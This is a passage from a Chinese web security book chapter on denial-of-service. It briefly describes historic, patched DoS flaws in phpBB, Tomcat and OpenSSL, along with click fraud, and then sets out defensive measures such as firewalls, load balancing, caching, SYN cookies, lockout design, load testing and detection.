2005 年，随着对 phpBB 的安全性研究的继续，三个新的漏洞被公布。第一个是搜索通配符，可以实现针对 CPU 的拒绝服务攻击。BBS 提供的搜索引擎对长度超过三个字符的内容做了索引；攻击者发现，提交通配符的查询，或者是提交一到两个字母的查询，这样的操作会导致显著的 CPU 占用率。像 “aa” 和 “ab”，这样的关键词没有被 BBS 的搜索引擎索引，所以会导致显著的性能问题。

第二个漏洞是可以通过 phpBB 上传并在服务器上执行任意的脚本。这些脚本让 phpBB 变成了僵尸机，黑客们把它当作 DoS 攻击的平台使用，就像那些蠕虫一样。phpBB 在用户

注册的时候，提供了 CAPTCHA 校验；然而，如果没有开启 CAPTCHA，攻击者可以很容易地利用工具自动生成大量账号，应用程序的用户表将会被塞满。CAPTCHA 是 Completely Automated Public Turing Test to Tell Computers and Humans Apart（“用以区分电脑与人类的完全自动化公开图灵测试”）的缩写，也被称为真人互动校对（Human Interactive Proof，HIP），这些测试可以自动鉴定用户究竟是机器还是人。通过启用 CAPTCHA 功能，攻击者就无法编写一些简单的脚本来自动创建成千上万的账号，因为这样的脚本是无法绕过 CAPTCHA 的检查的。更多关于 CAPTCHA 的知识，请参考后面的“验证码和 HIP”一节以及第 4 章。

更多的关于 phpBB 漏洞的讨论，请参见本章结尾的“参考和进一步阅读”一节。

### ⊖ phpBB DoS 攻击的对抗措施

我们讨论过的漏洞在当前版本的 phpBB 里，都已经解决了。关于登录的攻击，也可以通过打开 CAPTCHA 验证码功能来解决。

### Apache Tomcat 5.5 目录列举 DoS 攻击

流行度：2
简单度：8
影响度：3
风险度：4

Tomcat 是一个非常流行的开源应用服务器。2005 年 11 月，David Maciejak 发现，对一个有多个文件的文件夹，同时执行大量的文件列举操作，CPU 占用率可能会过高。由于只要发送一些目录列举请求就可以实施攻击，所以攻击者只需要使用一些通用的 Web 测试工具，就可以向 Tomcat 服务器发送大量的请求。问题实际上出在 Java 对文件系统的基本提取部分，该部分性能不好，所以导致类似问题的发生。你可以在“参考和进一步阅读”一节中，找到更多关于该问题的信息。

### ☑ 对 Tomcat 目录列举 DoS 攻击的对抗措施

在 5.5.13，5.0.31 版本的 Tomcat 中，这个漏洞已经被解决了。在 4.1.32 版本中，可以通过禁止目录列举来防范这种攻击。由于软件架构的局限带来的问题通常不容易解决，这个问题就是个很好的例子。

### OpenSSL ASN.1 解析错误 DoS 攻击

流行度：3
简单度：2
影响度：8
风险度：4

2003 年，在 OpenSSL Library ASN.1 的解析器（parser）里，发现了很多漏洞。比如，关于读取 X.509 证书的部分。这些漏洞会导致严重的后果，比如整数溢出，由于不正确的内存分配造成的堆栈损毁，或者读取存储证书的缓冲区时的越界。遇到以上任何一种情况，使用 OpenSSL 的程序都会崩溃。Novell 在随后的测试中又发现了一个新的问题，使用 OpenSSL Windows 系统，某些 ASN.1 流程会触发异常的超长递归。你可以在“参考和进一步阅读”一节里，找到关于这些问题的更多信息。

#### 应用层 DoS 攻击的对抗措施

前文中提及的漏洞的补丁已经在 OpenSSL 0.9.61 中发布。另外，很多的软件使用了 OpenSSL 库，因此这些软件的供应商也发布一些相关的补丁。

Java 和 .NET 等开发平台提供了内存管理机制，它们能够更好地解决内存资源的缺乏问题。程序不用自己处理资源的回收，虚拟机或 CLR（公共语言运行时）能够处理内存分配失败这样的错误。在这样的平台上编写的程序，更容易防范对于资源的攻击。这些开发平台天生支持多线程、锁和资源共享模式，同时也提供了适合处理过载和负载平衡等问题的数据结构。

一般来说，处理 DoS 攻击的最佳方法是找出能导致性能降低的部分。举个例子，登录是大部分网站都具备的功能，而且登录的过程通常比较慢，需要进行数据库查找，黑客可能会针对这些功能进行攻击。因此，很多网站采用 LDAP 来存放用户数据，而不是 SQL 数据库。LDAP 是一个轻量级的协议，很大程度上是为访问用户目录而设计的。LDAP 的另外一大优势是，针对用户登录过程的攻击，不会影响其他依赖于 SQL 的服务。这是一个分割站点功能以降低资源消耗的例子。

很多站点使用包含加密数据的 Cookie 来存储用户状态，这是在客户端实现的，而非服务器端。这样处理可能是出于性能的考虑，也可能是为了满足服务器端对于内存占用的要求，或者是为了负载均衡。使用 Cookie 的站点往往会计算好加密后 Cookie 的大小，然后使用某些算法加载到程序中。如果站点仅仅在一次登录会话中使用 Cookie，可以使用强度

稍弱的算法，比如 RC4。如果站点要让 Cookie 永久保存在用户的系统中，则需要采用强度大一些的算法，比如 TripleDES 和 AES。给 Cookie 设置适当的过期时间，并且限制时间的增长，可以防止黑客使用伪造的假 Cookie 来耗尽解密和处理的资源。

#### 骗取收入的攻击

流行度：5
简单度：5
影响度：8
风险度：6

骗取收入的攻击（denial-of-revenue），这个术语在 2003 年以前就有人用过，但是还未真正流行。它是指这样一类攻击，攻击者篡改 Web 应用程序逻辑，使网上交易时产生的货币收益或报酬转移到自己的名下，以谋取不正当的收入（所以，确切地说，这类攻击叫做“货币转移错误”更合适）。最常见的此类攻击的例子是，利用程序或廉价的人工（可能是在国外），疯狂地点击广告以从广告客户手里骗钱，这就是针对网络广告的点击欺骗。图 11-3 是这类欺骗的一个例子。

通过图 11-3，我们可以看出，这类攻击需要雇用一些人，不断地点击广告链接。这对系统可能会造成两方面的影响：第一，广告客户为一些无用的点击付钱，实际上真正的目标受众并没有看到这些广告；第二，以提供新闻和其他内容的站点，表面上的广告点击数比实际数目要多，于是可以获得更多的收入。第二点中提到的站点，一般都是提供内容的站点，而不是像 Google 这样的搜索引擎。

点击欺骗有多种常见形式。第一种是，雇用海外的廉价劳力，比如在印度和中国，让他们一直不停地点击广告，以获得收入。第二种则是，利用自动化的脚本或程序，来“点击”广告，以获得点击数。有了这样一些简单的技术，一条完整的产业链出现了。那些正当的广告客户根本不知道，一些阴暗的第三方在他们向顾客提供信息的过程中，从事着一些不为人知的勾当。

很多人认为点击欺骗只存在于搜索引擎和其他广告系统中,其实站点提供的很多服务都可能被攻击,并带来经济上的损失。比如,电子媒体（音乐,视频）许可、SMS短信、甚至普通邮件,都有可能被攻击者利用。用户注册其实就是常见目标之一,比如,如果自动地给每个注册者邮寄产品目录,攻击者就可能用一些伪造的地址,注册成千上万的账户。

 </div>

#### ☐ 针对骗取收入攻击的对抗措施

对抗这些攻击的措施在很大程度上取决于不同应用的本身。我们将提供一些普适的建议，然后给出一些具体的例子，比如点击欺骗等，以在更广的范围内阐明这些对抗措施。

防范应用程序层次的攻击的最好办法是在程序开发的整个流程里，进行完备的威胁建模（threat modeling）。第 13 章将介绍更多的关于威胁建模的内容。从本质上来说，要防范这类攻击，就要从攻击者的角度出发，同时在商业和技术的层次上，从整个应用程序的管

理、开发和测试的流程和文化等各方面，来考虑可能存在的威胁和风险。在针对骗取收入的攻击进行威胁建模时，要考虑以下几个关键点：

技术和非技术威胁的考虑 程序员通常专注于实现技术上的要求，而不曾考虑服务后面的整个运作模式。举一个在线音乐服务的例子，该服务可以提供30秒的音乐试听，如果想要听整首歌，就需要付费。程序员往往会设计这样一个系统，读取文件时，设一个标号以标记某个时间点，然后播放30秒，结束。该站点提供的歌曲的标号总是从0开始，因此每次总是从歌曲的开头开始播放。但是攻击者尝试改变这个标号时，可能会发现他们如果每次用不同位置的标号发送请求，最后就可以获得一首完整的歌曲。如果仅仅从技术的角度上考虑，这样的系统并没有什么问题（不算聪明，但至少可行），甚至同样的程序用在线广播和广告中，从技术上也说得过去。

不要信任客户端 攻击者在实施攻击时，喜欢伪装成其他用户，或者冒用他人的身份。很重要的一点是，你要知道是谁在网站上操作。这意味着，必须有一些机制对用户的身份进行验证，并且禁止经验证的用户以其他用户的身份进行操作。这必须要在不同的信任边界中验证。举个例子，大多数网络广告链接通常都将用户首先重定向到广告服务器，该服务器上记录着这些点击，接着，用户最终被重定向到用户感兴趣的站点上。广告服务器为什么会相信这些用户，并且为他们的广告链接付款呢？

依靠第三方的网络广告以获得收入的网站，都应该审查和确保来自于他们站点的点击是真实的。广告客户是不会为虚假的点击付钱的。而且，如果攻击者向站点发送大量请求，可能导致网络广告提供商产生疑问而拒绝支付费用。另外广告客户可能要求根据最终销售效果付费，这样通常是对广告客户更为有利。

如果有对用户免费但需要站点付费的服务，也需要认真进行审查。比如，一个站点提供免费的音乐服务，但是每次播放，该站点需要交纳相应的版权税。或者，允许用户免费发送短信，但是站点需要向移动服务商支付相关费用。以上任一种都可能让攻击者消耗站点的资金。

CAPTCHA 和 HIP 为了防止基于用户注册的攻击，很多站点使用 CAPTCHA 和 HIP（第 5 章有更多的相关内容）技术。

CAPTCHA 和 HIP 也是可能遭受 DoS 攻击的对象。这两种技术都需要大量的计算来产生挑战值（challenge），因此它们通常都是提前计算并存储好备用的。黑客可以尝试把这些储备用光，导致这些站点将无法访问，直到新的挑战值被计算出来。很多 CAPTCHA 的实现也很不健全，使得自动化系统可以很轻易地击败它们。某个 CAPTCHA 可能会使用固定的字体，连字形（字符），固定的旋转角度，无图像的变形和拉伸，固定的颜色，可以被预料的字符/目录设置等。这使得他们的保护措施没有任何作用，还是面临着用户注册攻击的威胁。

注意 产生 CAPTCHA 验证码是一种技术，而不是科学；机器很难精确地识别和处理这些图片，但是人可以很轻松地识别。如果人无法正常识别，那就没有必要提供这样的验证功能了。

为了防范某类攻击，但是又导致了新的攻击，这里就是一个很好的例子。这也说明，为什么即使有防范措施，也不能忘记威胁；因为防范措施可能失败，或者只是带来一些虚幻的好处。因此，威胁建模必须要重复地执行，而不仅仅是开发流程中特定的一个时间点要做的事情。

### 11.2 常见的 DoS 对抗措施

那些掌握着僵尸网络（botnets）的黑客们，手中控制着成千上万台的电脑……那是否网站管理员们就一定束手无策了呢？我们在前面的讨论中谈到了一些应对措施，但在这一节中，我们将会更多地介绍如何应对一般的 DoS 和 DDoS 问题。

几乎防范 DoS 攻击的所有手段都会强调增强网站的健壮性（robustness）和可扩展性（scalability）。但也如我们所见，如果发起攻击的僵尸网络过于庞大，想完全阻止 DoS 攻击实际上是不可能的，所以我们所能做的努力就只能是当系统受到攻击时，仍能扛住并保持运行。如果能让我们的站点在被攻击时仍能运行足够长的时间，我们就可能找出攻击者，然后赶跑他们。

大多数人的第一个念头几乎都是增多机器、增大带宽等简单的方法，试图掌握比黑客们更多的资源来取得胜利。但遗憾的是，我们的经济条件不允许这么做。而且这不但需要花费大量的钱财，能起到的防范效果也微乎其微。

那么，我们既无法完全阻止 DoS 攻击，又无财力投入更多的硬件和带宽来死扛，我们还能怎么办呢？在此，我们给出如下三步措施应对 DoS 攻击：

采取主动防御措施来降低攻击造成的损失，或者抵制住攻击。

启用一些方法来监测攻击。

☐ 制定应对攻击的计划。

以上步骤遵循着经典的安全“咒语”，那就是由预防、监测、应对构成的“深度防御”。我们将这一节中逐一详细讨论。

#### 11.2.1 主动 DoS 防御

我们前面已经谈到，攻击可能来自网络或者应用的多个层次。低层次攻击虽然很常见，而高层次攻击却通常具有更大的破坏性。我们的防御策略就必须把攻击可能来自的各个层

每次都考虑进去，因为攻击者总能找到并利用防御体系中最弱的一环。

##### DoS 防御产品

有些标榜能防御 DoS 攻击的产品，它们声称可以保护你的网站避免遭受 DoS，即使遭到某些 DoS 攻击时也能起到很好的防护作用。还有些设备通过增强系统的可扩展性，使系统在遭受攻击时能够应对骤然上升的负载，以保证仍能正常访问。我们使用这些产品时要重点了解它们能做到什么，不能做到什么，能在哪些方面提供保证，而在哪些方面则需另行处理。

防火墙 在很多方面看来，防火墙都是一个解决 DoS 攻击的简单方案。大多数站点都有使用防火墙来限制网络接入，所以同时使用防火墙来防范 DoS 当然是个很简单的做法。防火墙分为两大类——软件防火墙和硬件防火墙，它们在不同领域有各自的优势，但都可以起到防范 DoS 的作用。像 Checkpoint 的软件防火墙，通常就在监测 DoS 攻击方面表现突出，有些还能针对应用层的 DoS 攻击起到一定的作用。硬件防火墙则有能力处理网络流量方面的攻击，在应对巨大带宽的洪水攻击时表现优异。

Checkpoint 防火墙就有三种方式应对 SYN Flood 攻击，它们被统称为 SYNDefender。

第一，SYNDefender Relay 能确保在一个 SYN 从防火墙发送到服务器之前，从 SYN 源收到 ACK。第二，SYNDefender Gateway 能在服务器收到 SYN 并返回 SYN/ACK 后立即回应 ACK。此方法能保证服务器在必要时仍有可用连接，而不必一直等待客户端真实的 ACK 返回。第三，SYNDefender Passive Gateway 除了具备一台普通网关的功能外，还能做到在收到一个真实的 ACK 前不主动发给服务器 ACK，或者在超时的情况下发出 RST 关闭连接。如果服务器自身处理连接负载也没问题的话，SYNDefender Gateway 和 Passive Gateway 就能发挥其最佳性能。而当浩浩荡荡的洪水来袭时，SYNDefender Relay 就是最好的防范手段，因为它能抵御所有涌向防火墙的洪水。

防火墙用来应对 IP 层和 TCP 层的攻击。SYN 和 UDP 洪水、smurf 和 fragile 攻击，还有大多数针对协议栈上老旧弱点的攻击，几乎都能被防火墙解决掉。而集成了应用层代理的防火墙还可以对付应用层的 DoS 攻击，虽然这往往会把防火墙变成系统的瓶颈。由于防火墙只能在网络低层起到屏蔽或限制的作用，所以当一个针对高应用层的攻击来袭时，尽管从连接层看一切正常，而我们的网站仍会无法正常提供服务。防火墙本身其实也会受到 DoS 攻击，以致起不到任何保护的作用。

大多数防火墙都号称自己能处理多少连接：500 000，1 000 000，甚至更多，这些数字的确听起来不错。但是，一个小小的电缆调制解调器（cable modem）一秒钟便可以发出数百的 SYN，一台小小的僵尸机器一分钟便可以耗尽你的连接。我们需要更深入地了解这些产品的监测和管理性能，尤其是集群性能（clustering），它保证能统一使用和管理多台设备；还有就是故障迁移性能（failover），它保证防火墙能成对部署并在其中一台瘫痪时能由另一

台及时接替。类似 Netscreen 和 CiscoGuards 这些硬件防火墙就比软件防火墙更能承受更高的连接负载，它们也拥有更强的集群性能，这些性能只有像 Checkpoint 之类软件防火墙中的高端产品才会提供。但从另一个方面看，一个廉价软件防火墙方案却比一个廉价硬件防火墙功能更甚。把一台运行 IPTables 的 Linux 或者运行 PF 的 OpenBSD 的机器作为防火墙，除了能实现一台廉价的 SOHO 级防火墙的所有功能外，还能干更多的活，当然它们也需要投入更多的人力来专门管理。

负载均衡 负载均衡设备是为能处理大量 SYN 请求而设计的，在抵御 DoS 攻击方面，它能起到和防火墙一样的作用。大多数的负载均衡同样也能通过帮助 Web 服务器分流或代理 HTTP 初始请求来应对 HTTP 洪水攻击。所有的 HTTP 请求到了负载均衡器就被截获了，在负载均衡器和 Web 服务器之间只有一条单独连接，这样就减少了服务器通信方面的负载，使其能投入更多的资源来处理请求。许多负载均衡器还能支持 SSL 分流。SSL 是一种非常耗资源的协议，其加密处理要消耗服务器大量的 CPU 时间。SSL 分流设备使用专为加密功能设计的处理器，它比普通服务器能处理的客户请求多得多。

有几种常见的负载均衡搭建架构——其中一种就是数据链路层上的欺骗，也就所谓的在 Foundry 设备上的直接服务器返回（Direct Server Return，DSR）。这种技术就是当请求到达负载均衡设备时，只简单改写其目标 MAC 地址，然后将其送回给交换机转发到真实 Web 服务器上。将目标地址改写为不同的 MAC 地址就能把请求转发到不同的服务器。这一技术的优点就是，服务器的响应数据将不再经由负载均衡器转送而直接返回到客户端。由于负载均衡器在响应返回时不再一夫当关，也就消除了一个潜在的网络瓶颈，使负载均衡器能专注于处理不断到来的请求。而网站服务器也会专注于处理实际内容，发挥出最佳的性能，但是，此方法在处理应用“超级代理”的情况和 SSL 连接方面却有问题。超级代理（Mega-proxies）就是一个庞大的代理服务器群，像 AOL 和 RoadRunner 这类内容服务提供商都使用它聚合所有客户端的请求，因为通过代理后，数百万用户都共用同一个源 IP，当然也就不可能基于 IP 地址来过滤了。 $ ^{①} $

还有一种常见方案是通过让负载均衡器处理四层交换来实现。在负载均衡器上为置于其后的服务器设一个虚拟IP。当有请求需要送达这个虚拟IP时，这个请求就会被转发到某一台应对处理该虚拟IP请求的服务器。这是负载均衡架构中最常见的一种了。

我们将谈到的最后一种方案就是“延迟绑定”（delayed binding），在架构上实际和前面谈到的那种是一样的，但是其实现均衡的方式不同。该方式就是所谓的应用层交换，像

Alteon WebSwitches 和 CiscoGuards 这类高端产品能实现该方式。常见的负载方式无外乎，当请求到来时，转发给用最小延迟优先（lowest latency）、轮循（round robin）、顺序（sequential）、负载因子确定（load factor）等算法选定的一台服务器来处理。但这种方式不同，实现该方式的负载均衡器处理请求的时间发生在与后端服务器建立连接前，而且它自己能与客户端完成应用层的所有动作（也就是代服务器完成了 HTTP 握手）。这种方式的负载均衡不仅能抵御低层的 SYN 洪水，也能在应用层迫使攻击者必须完成合法的 HTTP 连接才能“接近”服务器。当然这使其在速度上有所损失，不过也使攻击者无法欺骗服务端（spoof），更难以施加攻击。

缓存设备 缓存是提高站点响应能力的最佳方法之一。将内容缓存使得服务器能有效处理复杂的请求。过去站点往往只是缓存图片、简单文本页面、下载的文件等静态内容，但随着应用层 DoS 攻击的出现，“明智”地缓存尽可能多的动态内容也受到人们的重视。对大多数站点来讲，其主页是点击率最高的页面。站点当然希望该页的内容都是动态的，但更明智的做法却是让它成为一个静态页面，然后以一定的频率及时更新它。这是我们在网站功能和性能上的折中，其关键就是让站点应对 DoS 攻击时足够健壮。

缓存设备的实现多种多样，从基本的用 Squid 做反向代理方式到利用像 Datapower 的硬件级 XML 处理设备来实现自定义 XML 处理。这些设备都无非实现这以下两种方式：通过在内存里缓存数据和静态内容来降低 IO 负载，或者为服务器分担像 SSL、XSL 转换、SAML 断言（SAML assertion）之类的复杂处理。采用专为这些功能设计的缓存设备，将使得服务器能专注处理一些更高级的任务。

注意 下一节将我们讨论像 Akamai 的可以提供全球 Web 按需扩容（capacity-on-demand）的缓存服务。

##### 容量规划

看起来有这么多神奇设备能帮助你缓解或对抗 DoS 攻击。那如何知道哪一种适合于你呢？当你决定使用其中之一的设备时，哪一个规模适合于你呢？这些问题的答案都来自于你的网站的容量规划和威胁模型分析（threat modeling）。有多少用户会访问你的网站，一个攻击者要花多少时间和努力才能使你的网站挂掉，这些问题都会在你的容量规划中起到指导作用。当然也别忘了你的站点以后的成长和提高的知名度。最最基本的一点，容量规划能明确地告诉站点管理员，我们的网站需要多少带宽和多少台服务器。

网络 因为各种各样的复杂原因，网络带宽往往是最容易也是最难获得的资源。如果服务器托管在数据中心或者在直接连接主干网接口的托管地，带宽资源当然容易获取。直接给 ISP（因特网服务提供商）打个电话，可能就把网站的带宽给提上去了。有站点托管都能自动平均地调整站点负载和分配流量。还有就是，当我们计划将服务器在某处托管时，

为网站今后可能增多的流量，还要考虑提供托管服务的 ISP 或者本地数据交换运行商（ILEC）为服务器新增数据线路的能力。

通常，把服务器托管在能享用数据专线的数据中心似乎就能很好地避免 DoS 攻击，在很大程度上来说，是可以的。而且，使用专线还有一个优点，就是能享受多家 ISP 提供的服务。如果有两家不同电信网络的光纤线路，这样的备份线路在应对来自于其中一家提供商的攻击时，可是一个法宝。我们可以完全截断受攻击的线路，把所有数据都转向到另一条连接。比如，某个攻击者可能是大学学生，他通过控制大量校园里的机器来发起 DoS 攻击。从该校园发出来的所有包都会经过某一个电信网络（骨干节点）再到达我们的服务器。我们就可以通过在该节点做包过滤来避免攻击，这样做也可能导致小部分用户无法正常访问站点，两害相权我们只能取其轻。

服务器相比诸如防火墙和负载均衡这些功能复杂花样繁多的设备，我们往往容易忽视一个最重要的资源——服务器。其实，提高站点能力的最简单方法莫过于买更强的或更多的服务器。配置更多的服务器不但有助于应对DoS攻击，对日常普通用户的访问体验也能起到很大的改善。提供更好的访问能力能降低请求处理的延迟，提供给用户更好的访问体验，也方便添加更多的业务应用和功能。但估量服务器的综合能力可能会比较难，不过一些测试的结果可以帮不少的忙（我们将在后面的“DoS测试”一节讨论测试的问题）。配置更多的服务器，也迫使我们不得不考虑更复杂的集群架构。但要记住，服务器并不能解决所有的DoS攻击问题，其关键在于要找准一个平衡点。

##### 与你的 ISP 合作

虽然大多数的 DoS 应对措施都是由网站管理员来操作的，但有时我们也需要外界的帮助。许多小站点并没有自己独立的网络，它们都托管在 ISP 的数据中心。大一点的公司虽然能自己做一些服务器管理，但也依旧依赖于 ISP。对于那些把 Web 服务器置于自己网络中的中小规模的公司，让 ISP 为他们做 DNS 比他们自己来负责 DNS 要好一些。从第三方购买 DNS 服务是把站点从因特网隔离开的一种最简单方法。ISP 通常为 DNS 服务设有专门的冗余设备，这是只有少数公司能自己完成的。DNS 也能实现一种最原始的负载均衡技术——DNS 轮循解析。DNS 轮循解析技术是让 DNS 服务器把一组 IP 地址轮流返回给对应域名的请求服务。这种技术把负载分散到了多个 IP 地址和多个服务器。DNS 轮循解析是很容易发觉 DoS 攻击者的，虽然阻止不了一意孤行的攻击者，但是它能减缓攻击者的动作，至少增加他们要攻击的目标。

大一点的公司和某些著名网站需要考虑更复杂的技术来维护站点，使其在受到 DoS 攻击时仍能运行。他们通过与 ISP 合作来实现全球服务器负载均衡（Global Server Load Balancing，GSLB）。GSLB 提供了一种以地域分割流量和在物理上把服务器分散开的方式。

通过这种方式，当红的网站可以满足多个地域的访问，而且当一台服务器在高负载下无法访问时，其他服务器能够顶替。DDoS 攻击来自不同的地域，如果分布在各地的服务器的容量都不足以应对攻击的话，它将是一种更难应对的攻击。当然运气好的话，仍会有一定比例的用户可以继续访问网站。

还有一种能与 GSLB 携手合作的技术，就是像 Akamai 或 Savvis CDN 这样的外部缓存服务。这类服务能在全球范围缓存静态网站内容，将其站点的流量转向或给代理，以此保护站点避免直接的网络攻击。Akamai 的缓存设备具有将大量的 SYN 通信“吸收”的功能设计，并能将请求分散到多台服务器，这使得 DDoS 攻击更难以确定目标。遗憾的是，这类外部缓存并不是处处适用，因为站点架构、内容类型，还有成本等因素，将使得该服务对某些站点并不奏效。

##### 强化网络边缘

因为有些小型站点都经由 ISP 托管，网络边缘 $ ^{②} $并不处在其站点管理员控制范围之内。因此他们就必须与 ISP 合作，以确保实现最佳的网络过滤。较大的站点拥有其自己的网络设备，他们自己就能处理更多这方面的事情。强化网络边缘的目标就是在端到端的数据通信路径上尽可能早的实现数据过滤。一个“坏”数据包在网络上被发送得越远，其消耗的资源就越多。

在一个典型的网络环境中，边界路由器（border router）连接着运行 Web 应用的网络的 ISP。ACL（Access Control List，访问控制列表）就配置在这台路由器上，用以过滤来自内部网络地址空间（10.x/172.16.x/192.168.x 等）的欺骗数据包，因为来自该地址空间的包是不可能在公网上路由的。许多资料都建议可以通过过滤 ICMP 包来防范基于 ICMP 的攻击和广播放大。但这显然不是一个绝佳的建议。ICMP 是一种用于诊断网络状况的必需协议，过滤或阻止这种协议将使得许多其他协议无法工作。一种更好的解决方法就是对 SYN 和 ICMP 包采取一定比率的过滤。使用 Cisco 的 CAR（Committed Access Rate，承诺访问比率）能提供保证网络流量的服务质量（Quality of Service）。ICMP 流量将被限制在可用带宽的一个小的比率内，这就能确保基于 ICMP 的洪水，或放大攻击，在到达站点服务器之前就被过滤掉了。

##### 强化服务器

不管设在网络边缘防范措施如何，运行着 Web 站点的服务器本身也必须做适当的配置。大多数增强服务器安全性的建议在应对 DoS 攻击方面都是适用的。其中头号建议就是

保证操作系统及时打补丁程序。本书讨论的攻击中所有被利用的操作系统弱点都早在已发布的补丁程序中解决了。这类攻击之所以还能奏效，就是因为只有少数管理员及时更新了补丁，解决了问题。坚持不懈地给操作系统打补丁是防范攻击中最重要的一步。

除了补丁，所有的操作系统都有办法调整网络处理协议栈来来处理不同的流量负载。在 Windows 系统中，大多数网络优化设置都能在注册表项"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters"下找到。

Linux 系统中有一个称作 SYNcookies 的特殊选项，该选项在应对 SYN Flood 攻击方面非常有用。如果使用该选项，在 SYN 回应从服务器端发出后，若没有接收到客户端的 ACK 响应，就不在操作系统中产生任何资源分配。这种方式通过牺牲处理负载来换取内存消耗。

##### Web 应用程序设计

应用程序设计可能是追踪 DoS 攻击时最难的问题。应用程序的许多地方都容易被攻击，许多功能都可能被滥用。我们的第一步就是深度的应用程序威胁建模分析。在应用程序设计和实现的过程中，进行合理的威胁模型分析和对某些细节的关注能发现很多潜在的问题。这是因为威胁建模分析需要对站点的每一部分都采取近乎偏执的观察分析。

正如我们所见过的蠕虫 MyDoom-O 造成的 DDoS 攻击，那是该蠕虫“无意”间引起的针对搜索引擎 Google 的应用层攻击，应用层之间正确合理地进行资源分配是抵御该类攻击的关键 $ ^{③} $。尽可能多的缓存内容，并恰当地处理缓存失效情况，是非常关键和重要的。做威胁建模分析时，其重要的一部分就是确定攻击者是否能轻易地突破你的前两层内容缓存，而到达真实的应用程序层。接下来，我们还会讨论一些应对常见问题的方法。

数据处理 尽可能不要在客户端做数据处理，当然如果数据不敏感的话可以考虑在客户端做数据处理。做数据加密时，应使用标准的程序库和协议。尽可能不要自己尝试实现一套加密、认证和授权机制。当需要为客户端实现某些数据处理时，应保证该过程是被限制在一个给定时间内完成的，保证合法用户必定能获得处理结果（换句话说，就是对于匿名用户的数据处理，要做长度方面的限制）。此外，我们还可以尽可能地缓存处理结果，采用索引来快速获取数据，并尽可能地使用静态数据而非动态等机制。

内存 不要允许客户端输入任意长度的数据。当读入数据时，应为内存使用设置合理的限制，当超过这个限制时，应让处理事务失败回滚或被限制（throttle）。对大量和复杂的

请求，应该采用批处理的机制避免对大量内存的并发访问。不要以为操作系统的虚拟内存管理会为我们很好地处理大量内存使用情况，因为低速硬盘的数据访问会使得站点性能变得非常差。我们应尽可能地使用内存缓存数据，并把缓存空间限制在一定范围内。

数据库 尽可能地缓存从数据库读取的数据，以减少数据库查询量。调整数据库连接池，避免出现连接耗尽的情况，保证与数据库的网络连接是准备好的而非必需产生的。尽可能避免使用复杂的联合查询，并充分利用索引来加速数据库数据查询。使用存储过程而非串接字符串来优化查询。如果数据库支持把表挂入内存中，那就如此处理那些频繁查询的表。

用户登录应用程序设计中技巧性最高的决策之一就是对用户名和密码的控制。除了通常关注的密码长度问题之外，一个能应对DoS攻击的站点必须决定如何处理用户登录失败。最常见的处理方法就是账号冻结，这种方法也能防止对用户名密码的暴力破解。但很可惜，这种方法也有副作用，如果攻击者的目的是让合法用户无法登录系统，利用此方法他将很容易实现。如果攻击者能如此简单阻止用户成功登录，那就没必要非尽脑汁用其他方式把系统搞瘫痪了。

其实应用程序开发者还有两个办法可以解决这个问题：

○ 不采取冻结账号的方式，而是采取其他方法拖延攻击者足够长的时间来使暴力破解无效；

☐ 实现一种账号冻结策略来缓解用户账号被冻结时的不良用户体验。

对很容易被猜测、预测或获取真实系统用户名的应用程序，选择最好应用第一种方法。我们可以通过减缓对请求的反应速度，密码的复杂性要求（密码强度越高，暴力破解所需的猜测的密码量就越大），还有 HIP/CAPTCHA（请参见本章前面部分）来拖延攻击者。

对于连用户名都需要像密码那样暴力破解才能获取的系统，最好应用第二种方法。这类系统通常会设置一个尝试次数的限制，达到这个次数的密码错误，账号就会被冻结。而账号被冻结的次数越多，其被冻结的时限也越来越长。账号从冻结状态中恢复的手续不能太繁琐，这样因攻击者而引起的正常用户账号冻结才不会明显让用户感觉不便。从可用性方面考虑，普通的冻结时限结束，或者要求用户改变密码，或者HIP/CAPTCHA，都可以用来恢复账号。

提示 如果站点的用户名和密码需要攻击者暴力破解，就会增加攻击过程的难度，这一点也教育我们要保护信息，不要把信息泄露给攻击者，尤其在登录失败显示的信息不能透露是否是因为用户名和密码错误而导致失败，因为攻击者可能从中得到提示。

#### 11.2.2 DoS 测试（DoS Testing）

如果不进行积极主动且持续不断的测试，再强大的系统配置和优良的程序设计都是无

用的。好的站点会持续不断地测试其负载能力，并在新的组件和功能正式上线之前，都会进行完善的测试。测试低层次网络协议的洪水攻击并没有多大意义，因为只要攻击者拥有足够的资源，总是能够成功实现 DoS 攻击，但是我们必须对应用层的攻击进行测试，尤其是对重要的 Web 应用程序的某些关键功能进行测试。有许多站点负载的测试工具，像 JMeter、OpenSTA、Webload 和微软的 Web Application Stress Tool，都很容易用来进行站点的 DoS 测试。而像 ANTARA 的 FlameThrower 这类高级系统，则采用了专用的硬件来快速产生复杂的应用请求。我们测试的目的在于找到系统达到最大资源应用的临界点，以及确定系统能承受的最大负载。图 11-4 为 JMeter 在做一个 Web 应用的负载测试时的图表。

 </div>

##### 监测 DoS

战胜 DoS 攻击的第一步就是在它出现时要第一时间知晓。通过适当的 log 记录、监测设备，还有合理的告警通知系统来察觉 DoS 攻击已经出现，比起等到当无法登录站点的客户在电话里愤愤不平地抱怨时才发现 DoS 攻击要好得多了。

##### 检查系统

虽然系统日志可能是最容易确定攻击是否出现的方法，但我们仍然有不少方法检查系统当前状况来确定攻击是否发生。在 Windows 系统上我们可以通过任务管理器，或者在 UNIX/Linux 系统上用 top 来观察 CPU 利用率是否到达 100%。或者通过看系统 I/O 负载来观察是否磁盘活动已经近乎“僵死”。几乎所有的操作系统都有 netstat 命令，我们可以通过它查看当前网络各级协议的运行状况。当遭受 SYN Flood 攻击时，运行 netstat，我们会看到无以计数的 SYN_RECV 连接，而且很明显能看出它们都来自非常随机的 IP 和端口范围。而遭受 “connection-hogging” 攻击时，我们能通过 netstat 看到大量的处于 ESTABLISHED 或 FIN_WAIT 状态的连接。不过需要注意的是，基于 UDP 的洪水攻击，通过 netstat 则完全观察不出任何端倪来。

##### 系统日志和告警通知

